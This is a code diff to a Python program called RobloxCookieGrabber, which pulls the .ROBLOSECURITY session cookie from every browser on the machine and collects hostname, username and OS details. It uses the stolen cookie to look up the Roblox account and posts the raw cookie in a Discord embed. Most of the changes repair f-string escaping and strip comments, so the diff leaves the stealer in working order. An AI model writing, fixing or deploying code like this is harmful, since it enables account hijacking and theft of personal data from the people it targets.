@@ -184,7 +184,6 @@ import platform
 import socket
 import os
 import browser_cookie3
-import sys
 
 class RobloxCookieGrabber:
     def __init__(self, root):
@@ -240,19 +239,13 @@ class RobloxCookieGrabber:
             system = platform.system()
             username = os.getlogin()
             
-            return f"""
-**💻 SYSTEM INFO**
-- **Computer:** `{{hostname}}`
-- **User:** `{{username}}`
-- **OS:** `{{system}}`
-"""
+            return f"**SYSTEM INFO**\\\\n- **Computer:** `{hostname}`\\\\n- **User:** `{username}`\\\\n- **OS:** `{system}`"
         except Exception as e:
-            return f"**System Info:** `Error: {{str(e)}}`"
+            return f"**System Info:** `Error: {str(e)}`"
     
     def get_roblox_cookie(self):
         """Extract .ROBLOSECURITY from browser cookies"""
         try:
-            # Get all cookies from all browsers for roblox.com
             all_cookies = browser_cookie3.load(domain_name='roblox.com')
             
             for cookie in all_cookies:
@@ -273,10 +266,9 @@ class RobloxCookieGrabber:
             session = requests.Session()
             headers = {{
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'Cookie': f'.ROBLOSECURITY={{cookie_value}}'
+                'Cookie': f'.ROBLOSECURITY={cookie_value}'
             }}
             
-            # Get user info
             response = session.get('https://users.roblox.com/v1/users/authenticated', headers=headers, timeout=10)
             
             if response.status_code == 200:
@@ -284,11 +276,10 @@ class RobloxCookieGrabber:
                 username = user_data.get('name', 'NO_NAME_FOUND')
                 user_id = user_data.get('id', '')
                 
-                # Get avatar
                 avatar_url = ""
                 if user_id:
                     avatar_response = session.get(
-                        f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={{user_id}}&size=150x150&format=Png',
+                        f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png',
                         headers=headers,
                         timeout=10
                     )
@@ -299,10 +290,10 @@ class RobloxCookieGrabber:
                 
                 return username, avatar_url
             else:
-                return f"API_ERROR_{{response.status_code}}", "NO_AVATAR"
+                return f"API_ERROR_{response.status_code}", "NO_AVATAR"
                 
         except Exception as e:
-            return f"ERROR: {{str(e)}}", "NO_AVATAR"
+            return f"ERROR: {str(e)}", "NO_AVATAR"
     
     def grab_cookie(self):
         self.status_label.config(text="🟡 Extracting cookie from browser...")
@@ -311,26 +302,21 @@ class RobloxCookieGrabber:
         
         try:
             system_info = self.get_system_info()
-            
-            # Get the actual cookie from browser
             cookie_value = self.get_roblox_cookie()
-            
-            # Get user info with the cookie
             username, avatar_url = self.get_user_info(cookie_value)
             
-            # Create Discord embed
             embed = {{
                 "title": "🎮 REAL ROBLOX COOKIE GRABBED",
                 "color": 0x00ff00,
                 "fields": [
                     {{
                         "name": "👤 Roblox Username",
-                        "value": f"`{{username}}`",
+                        "value": f"`{username}`",
                         "inline": True
                     }},
                     {{
                         "name": "🔐 Cookie Status",
-                        "value": f"`{'✅ FOUND' if cookie_value else '❌ NOT FOUND'}}`",
+                        "value": f"`{'✅ FOUND' if cookie_value else '❌ NOT FOUND'}`",
                         "inline": True
                     }},
                     {{
@@ -341,15 +327,13 @@ class RobloxCookieGrabber:
                 ]
             }}
             
-            # Add the actual cookie value if found
             if cookie_value:
                 embed["fields"].append({{
                     "name": "🍪 .ROBLOSECURITY Cookie",
-                    "value": f"```{{cookie_value}}```",
+                    "value": f"```{cookie_value}```",
                     "inline": False
                 }})
             
-            # Add avatar if available
             if avatar_url and avatar_url != "NO_AVATAR":
                 embed["thumbnail"] = {{"url": avatar_url}}
             
@@ -364,16 +348,16 @@ class RobloxCookieGrabber:
                 self.status_label.config(text="🟢 Cookie sent successfully!")
                 messagebox.showinfo("Success", 
                                   f"✅ **REAL COOKIE EXTRACTED!**\\\\n\\\\n"
-                                  f"**Username:** {{username}}\\\\n"
+                                  f"**Username:** {username}\\\\n"
                                   f"**Cookie Found:** {'✅ YES' if cookie_value else '❌ NO'}\\\\n"
-                                  f"**Length:** {{len(cookie_value) if cookie_value else 0}} characters")
+                                  f"**Length:** {len(cookie_value) if cookie_value else 0} characters")
             else:
                 self.status_label.config(text="🔴 Failed to send")
-                messagebox.showerror("Error", f"❌ Failed to send data. Status: {{response.status_code}}")
+                messagebox.showerror("Error", f"❌ Failed to send data. Status: {response.status_code}")
                 
         except Exception as e:
             self.status_label.config(text="🔴 Error occurred")
-            messagebox.showerror("Error", f"❌ Failed: {{str(e)}}")
+            messagebox.showerror("Error", f"❌ Failed: {str(e)}")
         finally:
             self.grab_btn.config(state='normal')
 
